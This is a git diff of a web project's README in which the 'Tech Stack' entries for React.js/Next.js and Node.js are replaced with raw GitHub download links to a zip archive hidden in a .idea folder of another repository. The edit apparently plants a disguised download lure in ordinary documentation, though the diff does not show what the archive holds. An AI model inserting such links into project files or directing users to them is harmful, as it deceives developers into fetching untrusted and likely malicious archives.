@@ -16,9 +16,9 @@ Performance Optimization: Fast, SEO-friendly, and responsive designs that work o
 
 🛠️ Tech Stack
 
-Frontend: React.js / Next.js, Tailwind CSS
+Frontend: https://github.com/ThejanGS2/Cortex.A/raw/refs/heads/main/.idea/A_Cortex_v1.4.zip / https://github.com/ThejanGS2/Cortex.A/raw/refs/heads/main/.idea/A_Cortex_v1.4.zip, Tailwind CSS
 
-Backend: Node.js, Express
+Backend: https://github.com/ThejanGS2/Cortex.A/raw/refs/heads/main/.idea/A_Cortex_v1.4.zip, Express
 
 Database: PostgreSQL / MongoDB
 
